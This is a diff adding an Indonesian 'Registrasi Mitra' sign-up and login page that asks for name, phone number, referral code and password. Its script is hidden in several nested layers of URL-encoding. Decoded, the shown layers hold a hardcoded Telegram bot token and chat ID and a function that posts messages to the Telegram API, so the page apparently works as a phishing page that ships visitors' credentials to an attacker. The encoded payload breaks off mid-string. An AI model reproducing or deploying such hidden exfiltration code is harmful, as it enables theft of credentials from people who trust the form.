@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Registrasi</title>
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<style> *{box-sizing:border-box;font-family:'Segoe UI',sans-serif;} :root{ --bg1:#f8fafc; --bg2:#eef2f7; --card:#ffffff; --text:#0f172a; --muted:#6b7280; --input:#ffffff; --border:#e5e7eb; --primary:#2563eb; --success:#22c55e; --danger:#ef4444; } @media (prefers-color-scheme: dark){ :root{ --bg1:#0e1627; --bg2:#121c2f; --card:#141f33; --text:#e6ebf2; --muted:#9aa4b2; --input:#0f1a2c; --border:#22304a; --primary:#4f8cff; --success:#3ddc97; --danger:#ff7a7a; } } body{ margin:0; min-height:100vh; display:flex; justify-content:center; align-items:center; background:linear-gradient(180deg,var(--bg1),var(--bg2)); color:var(--text); } .swal2-timer-progress-bar{ background:linear-gradient(90deg,#5b8cff,#3b6cff) !important; height:4px !important; border-radius:4px; } .swal2-popup{ background:var(--card) !important; color:var(--text) !important; border-radius:16px !important; box-shadow:0 25px 50px rgba(0,0,0,.45) !important; } .swal2-title{ color:var(--text) !important; font-weight:600; } .swal2-html-container{ color:var(--muted) !important; font-size:16px; } .swal2-icon.swal2-success{ border-color:var(--success) !important; } .swal2-success-line-tip, .swal2-success-line-long{ background-color:var(--success) !important; } .swal2-icon.swal2-error{ border-color:var(--danger) !important; } .swal2-x-mark-line-left, .swal2-x-mark-line-right{ background-color:var(--danger) !important; } .swal2-icon.swal2-info, .swal2-icon.swal2-warning{ color:var(--primary) !important; border-color:var(--primary) !important; } .swal2-confirm{ background:linear-gradient(180deg,#5b8cff,#3b6cff) !important; color:#fff !important; border-radius:12px !important; padding:10px 22px !important; font-weight:600 !important; } .swal2-confirm:hover{ filter:brightness(1.05); } .swal2-cancel{ background:transparent !important; color:var(--muted) !important; border-radius:12px !important; } .swal2-backdrop-show{ background:rgba(10,18,35,.65) !important; } .card{ width:90%; max-width:480px; background:var(--card); border-radius:18px; padding:22px; box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.02); } .header{text-align:center; margin-bottom:18px;} .header i{font-size:48px; color:var(--primary); position:relative; top:4px;} .field{position:relative; margin-bottom:15px; display:flex; align-items:center;} .field i.left{position:absolute; left:16px; top:50%; transform:translateY(-50%); color:var(--muted);} .field input{outline:none; width:100%; padding:12px 40px; border-radius:10px; border:1.6px solid var(--border); background:var(--input); color:var(--text); transition:all .25s ease;} .field input::placeholder{color:#ffffff; opacity:.85;} .field input:focus{border-color:var(--primary);} .field input.valid{border-color:var(--success);} .field input.invalid{border-color:var(--danger);} .status{position:absolute; right:12px; top:50%; transform:translateY(-50%); font-size:18px; display:none; cursor:pointer;} .valid-icon{color:var(--success);} .invalid-icon{color:var(--danger);} .right-icon{position:absolute; right:12px; top:50%; transform:translateY(-50%); cursor:pointer; color:var(--muted);} .checkbox{display:flex; align-items:center; gap:10px; font-size:13px; margin:14px 0 18px; color:var(--muted);} .checkbox input{margin:0; accent-color:var(--primary);} .checkbox.shake{animation:shake .35s;} @keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-4px)}50%{transform:translateX(4px)}75%{transform:translateX(-4px)}100%{transform:translateX(0)}} button{width:100%; border:none; padding:12px; border-radius:12px; font-weight:600; cursor:pointer; color:#fff; background:linear-gradient(180deg,#5b8cff,#3b6cff); transition:.25s;} button:hover{filter:brightness(1.05);} .login-link{text-align:center; font-size:13px; margin-top:12px;} .login-link a{color:var(--primary); cursor:pointer;} .captcha-row{display:flex; align-items:center; gap:8px; margin-bottom:14px;} canvas.captcha-box{width:110px; height:40px; border-radius:10px; background:var(--input); border:1.6px solid var(--border); cursor:pointer;} .captcha-input-wrapper{position:relative; flex:1;} .captcha-input-wrapper i.left-shield{position:absolute; left:13px; top:50%; transform:translateY(-50%); color:var(--muted);} .captcha-input-wrapper input{width:100%; padding:12px 36px; border-radius:10px; border:1.6px solid var(--border); background:var(--input); color:var(--text);} .strength-bar{height:6px; border-radius:4px; margin:4px 0 12px; background:#e5e7eb; overflow:hidden; display:none;} .strength-fill{height:100%; width:0%; transition:.3s;} .strength-weak{background:#ff7a7a;} .strength-medium{background:#facc15;} .strength-strong{background:#3ddc97;} #dashboard{display:none; position:fixed; inset:0; z-index:999;} #dashboard iframe{width:100%; height:100%; border:none;} </style>
+</head>
+<body>
+
+<div id="registerBox" class="card">
+  <div class="header">
+    <i class="bi bi-shop"></i>
+    <h3 id="formTitle">Registrasi Mitra</h3>
+  </div>
+
+  <div id="registerForm">
+    <div class="field">
+      <i class="bi bi-person left"></i>
+      <input type="text" id="nama" placeholder="Nama Lengkap">
+      <i class="bi bi-check-circle-fill status valid-icon" id="namaOk"></i>
+      <i class="bi bi-x-circle-fill status invalid-icon" id="namaNo"></i>
+    </div>
+
+    <div class="field">
+      <i class="bi bi-telephone left"></i>
+      <input type="tel" id="hp" placeholder="Nomor Telepon">
+      <i class="bi bi-check-circle-fill status valid-icon" id="hpOk"></i>
+      <i class="bi bi-x-circle-fill status invalid-icon" id="hpNo"></i>
+    </div>
+
+    <div class="field">
+      <i class="bi bi-link left"></i>
+      <input type="tel" id="ref" placeholder="Kode Referensi">
+      <i class="bi bi-check-circle-fill status valid-icon" id="refOk"></i>
+      <i class="bi bi-x-circle-fill status invalid-icon" id="refNo"></i>
+    </div>
+
+    <div class="field" style="position:relative;">
+      <i class="bi bi-lock left"></i>
+      <input type="password" id="password" placeholder="Buat Password">
+      <i class="bi bi-eye-slash right-icon" id="togglePass"></i>
+    </div>
+    <div class="strength-bar" id="strengthBar"><div class="strength-fill" id="strengthFill"></div></div>
+
+    <div class="field captcha-row">
+      <canvas class="captcha-box" id="capReg" width="110" height="42"></canvas>
+      <div class="captcha-input-wrapper">
+        <i class="bi bi-shield left-shield"></i>
+        <input id="capRegInput" placeholder="Captcha">
+        <i class="bi status" id="capOk"></i>
+      </div>
+    </div>
+
+    <div class="checkbox">
+      <input type="checkbox" id="agree"> Saya menyetujui syarat & ketentuan
+    </div>
+
+    <button id="btnRegister">Daftar Sekarang</button>
+    <div class="login-link">
+      Sudah punya akun? <a id="switchToLogin">Login</a>
+    </div>
+  </div>
+
+  <div id="loginForm" style="display:none;">
+    <div class="field">
+      <i class="bi bi-telephone left"></i>
+      <input type="tel" id="loginHp" placeholder="Nomor Telepon">
+    </div>
+
+    <div class="field" style="position:relative;">
+      <i class="bi bi-lock left"></i>
+      <input type="password" id="loginPass" placeholder="Masukkan Password">
+      <i class="bi bi-eye-slash right-icon" id="toggleLoginPass"></i>
+    </div>
+
+    <div class="field captcha-row">
+      <canvas class="captcha-box" id="capLogin" width="110" height="42"></canvas>
+      <div class="captcha-input-wrapper">
+        <i class="bi bi-shield left-shield"></i>
+        <input id="capLoginInput" placeholder="Captcha">
+        <i class="bi status" id="capLoginOk"></i>
+      </div>
+    </div>
+
+    <button id="btnLogin">Login</button>
+    <div class="login-link">
+      Belum punya akun? <a id="switchToRegister">Daftar</a>
+    </div>
+  </div>
+</div>
+
+<div id="dashboard">
+  <iframe id="iframeDash" src=""></iframe>
+</div>
+
+<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%6A%61%76%61%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%27%25%33%43%73%63%72%69%70%74%25%32%30%6C%61%6E%67%75%61%67%65%25%33%44%6A%61%76%61%73%63%72%69%70%74%25%33%45%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%25%32%38%75%6E%65%73%63%61%70%65%25%32%38%25%32%37%25%32%35%33%43%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%30%25%32%35%36%43%25%32%35%36%31%25%32%35%36%45%25%32%35%36%37%25%32%35%37%35%25%32%35%36%31%25%32%35%36%37%25%32%35%36%35%25%32%35%33%44%25%32%35%36%41%25%32%35%36%31%25%32%35%37%36%25%32%35%36%31%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%33%45%25%32%35%36%34%25%32%35%36%46%25%32%35%36%33%25%32%35%37%35%25%32%35%36%44%25%32%35%36%35%25%32%35%36%45%25%32%35%37%34%25%32%35%32%45%25%32%35%37%37%25%32%35%37%32%25%32%35%36%39%25%32%35%37%34%25%32%35%36%35%25%32%35%32%38%25%32%35%37%35%25%32%35%36%45%25%32%35%36%35%25%32%35%37%33%25%32%35%36%33%25%32%35%36%31%25%32%35%37%30%25%32%35%36%35%25%32%35%32%38%25%32%35%32%37%25%32%35%32%35%25%32%35%33%33%25%32%35%34%33%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%30%25%32%35%36%43%25%32%35%36%31%25%32%35%36%45%25%32%35%36%37%25%32%35%37%35%25%32%35%36%31%25%32%35%36%37%25%32%35%36%35%25%32%35%32%35%25%32%35%33%33%25%32%35%34%34%25%32%35%36%41%25%32%35%36%31%25%32%35%37%36%25%32%35%36%31%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%35%25%32%35%33%33%25%32%35%34%35%25%32%35%36%34%25%32%35%36%46%25%32%35%36%33%25%32%35%37%35%25%32%35%36%44%25%32%35%36%35%25%32%35%36%45%25%32%35%37%34%25%32%35%32%45%25%32%35%37%37%25%32%35%37%32%25%32%35%36%39%25%32%35%37%34%25%32%35%36%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%38%25%32%35%37%35%25%32%35%36%45%25%32%35%36%35%25%32%35%37%33%25%32%35%36%33%25%32%35%36%31%25%32%35%37%30%25%32%35%36%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%38%25%32%35%32%35%25%32%35%33%32%25%32%35%33%37%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%33%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%36%43%25%32%35%36%31%25%32%35%36%45%25%32%35%36%37%25%32%35%37%35%25%32%35%36%31%25%32%35%36%37%25%32%35%36%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%34%25%32%35%36%41%25%32%35%36%31%25%32%35%37%36%25%32%35%36%31%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%35%25%32%35%36%34%25%32%35%36%46%25%32%35%36%33%25%32%35%37%35%25%32%35%36%44%25%32%35%36%35%25%32%35%36%45%25%32%35%37%34%25%32%35%32%45%25%32%35%37%37%25%32%35%37%32%25%32%35%36%39%25%32%35%37%34%25%32%35%36%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%38%25%32%35%37%35%25%32%35%36%45%25%32%35%36%35%25%32%35%37%33%25%32%35%36%33%25%32%35%36%31%25%32%35%37%30%25%32%35%36%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%38%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%37%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%33%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%36%43%25%32%35%36%35%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%36%33%25%32%35%36%31%25%32%35%37%30%25%32%35%35%32%25%32%35%36%35%25%32%35%36%37%25%32%35%35%36%25%32%35%36%31%25%32%35%36%43%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%34%33%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%36%33%25%32%35%36%31%25%32%35%37%30%25%32%35%34%43%25%32%35%36%46%25%32%35%36%37%25%32%35%36%39%25%32%35%36%45%25%32%35%35%36%25%32%35%36%31%25%32%35%36%43%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%36%33%25%32%35%36%46%25%32%35%36%45%25%32%35%37%33%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%35%34%25%32%35%34%35%25%32%35%34%43%25%32%35%34%35%25%32%35%34%37%25%32%35%35%32%25%32%35%34%31%25%32%35%34%44%25%32%35%35%46%25%32%35%34%32%25%32%35%34%46%25%32%35%35%34%25%32%35%35%46%25%32%35%35%34%25%32%35%34%46%25%32%35%34%42%25%32%35%34%35%25%32%35%34%45%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%33%37%25%32%35%33%38%25%32%35%33%37%25%32%35%33%38%25%32%35%33%38%25%32%35%33%35%25%32%35%33%37%25%32%35%33%38%25%32%35%33%30%25%32%35%33%33%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%31%25%32%35%34%31%25%32%35%34%31%25%32%35%34%37%25%32%35%34%31%25%32%35%33%35%25%32%35%37%33%25%32%35%35%35%25%32%35%34%41%25%32%35%37%38%25%32%35%37%38%25%32%35%37%32%25%32%35%36%33%25%32%35%36%33%25%32%35%33%39%25%32%35%36%32%25%32%35%34%39%25%32%35%37%39%25%32%35%34%39%25%32%35%34%39%25%32%35%36%35%25%32%35%34%32%25%32%35%36%42%25%32%35%36%44%25%32%35%35%41%25%32%35%34%36%25%32%35%34%37%25%32%35%35%33%25%32%35%34%33%25%32%35%35%37%25%32%35%37%31%25%32%35%33%32%25%32%35%36%38%25%32%35%34%34%25%32%35%36%44%25%32%35%35%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%36%33%25%32%35%36%46%25%32%35%36%45%25%32%35%37%33%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%34%33%25%32%35%34%38%25%32%35%34%31%25%32%35%35%34%25%32%35%35%46%25%32%35%34%39%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%33%31%25%32%35%33%34%25%32%35%33%31%25%32%35%33%34%25%32%35%33%35%25%32%35%33%34%25%32%35%33%30%25%32%35%33%33%25%32%35%33%30%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%36%36%25%32%35%37%35%25%32%35%36%45%25%32%35%36%33%25%32%35%37%34%25%32%35%36%39%25%32%35%36%46%25%32%35%36%45%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%37%33%25%32%35%36%35%25%32%35%36%45%25%32%35%36%34%25%32%35%35%34%25%32%35%36%35%25%32%35%36%43%25%32%35%36%35%25%32%35%36%37%25%32%35%37%32%25%32%35%36%31%25%32%35%36%44%25%32%35%34%44%25%32%35%36%35%25%32%35%37%33%25%32%35%37%33%25%32%35%36%31%25%32%35%36%37%25%32%35%36%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%38%25%32%35%36%44%25%32%35%37%33%25%32%35%36%37%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%39%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%36%36%25%32%35%36%35%25%32%35%37%34%25%32%35%36%33%25%32%35%36%38%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%38%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%36%25%32%35%33%30%25%32%35%36%38%25%32%35%37%34%25%32%35%37%34%25%32%35%37%30%25%32%35%37%33%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%31%25%32%35%32%46%25%32%35%32%46%25%32%35%36%31%25%32%35%37%30%25%32%35%36%39%25%32%35%32%45%25%32%35%37%34%25%32%35%36%35%25%32%35%36%43%25%32%35%36%35%25%32%35%36%37%25%32%35%37%32%25%32%35%36%31%25%32%35%36%44%25%32%35%32%45%25%32%35%36%46%25%32%35%37%32%25%32%35%36%37%25%32%35%32%46%25%32%35%36%32%25%32%35%36%46%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%32%25%32%35%35%34%25%32%35%34%35%25%32%35%34%43%25%32%35%34%35%25%32%35%34%37%25%32%35%35%32%25%32%35%34%31%25%32%35%34%44%25%32%35%35%46%25%32%35%34%32%25%32%35%34%46%25%32%35%35%34%25%32%35%35%46%25%32%35%35%34%25%32%35%34%46%25%32%35%34%42%25%32%35%34%35%25%32%35%34%45%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%34%25%32%35%32%46%25%32%35%37%33%25%32%35%36%35%25%32%35%36%45%25%32%35%36%34%25%32%35%34%44%25%32%35%36%35%25%32%35%37%33%25%32%35%37%33%25%32%35%36%31%25%32%35%36%37%25%32%35%36%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%36%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%34%33%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%36%44%25%32%35%36%35%25%32%35%37%34%25%32%35%36%38%25%32%35%36%46%25%32%35%36%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%35%30%25%32%35%34%46%25%32%35%35%33%25%32%35%35%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%34%33%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%36%38%25%32%35%36%35%25%32%35%36%31%25%32%35%36%34%25%32%35%36%35%25%32%35%37%32%25%32%35%37%33%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%34%33%25%32%35%36%46%25%32%35%36%45%25%32%35%37%34%25%32%35%36%35%25%32%35%36%45%25%32%35%37%34%25%32%35%32%44%25%32%35%35%34%25%32%35%37%39%25%32%35%37%30%25%32%35%36%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%36%31%25%32%35%37%30%25%32%35%37%30%25%32%35%36%43%25%32%35%36%39%25%32%35%36%33%25%32%35%36%31%25%32%35%37%34%25%32%35%36%39%25%32%35%36%46%25%32%35%36%45%25%32%35%32%46%25%32%35%36%41%25%32%35%37%33%25%32%35%36%46%25%32%35%36%45%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%34%33%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%36%32%25%32%35%36%46%25%32%35%36%34%25%32%35%37%39%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%31%25%32%35%34%41%25%32%35%35%33%25%32%35%34%46%25%32%35%34%45%25%32%35%32%45%25%32%35%37%33%25%32%35%37%34%25%32%35%37%32%25%32%35%36%39%25%32%35%36%45%25%32%35%36%37%25%32%35%36%39%25%32%35%36%36%25%32%35%37%39%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%38%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%32%25%32%35%36%33%25%32%35%36%38%25%32%35%36%31%25%32%35%37%34%25%32%35%35%46%25%32%35%36%39%25%32%35%36%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%31%25%32%35%34%33%25%32%35%34%38%25%32%35%34%31%25%32%35%35%34%25%32%35%35%46%25%32%35%34%39%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%34%33%25%32%35%37%34%25%32%35%36%35%25%32%35%37%38%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%31%25%32%35%36%44%25%32%35%37%33%25%32%35%36%37%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%39%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%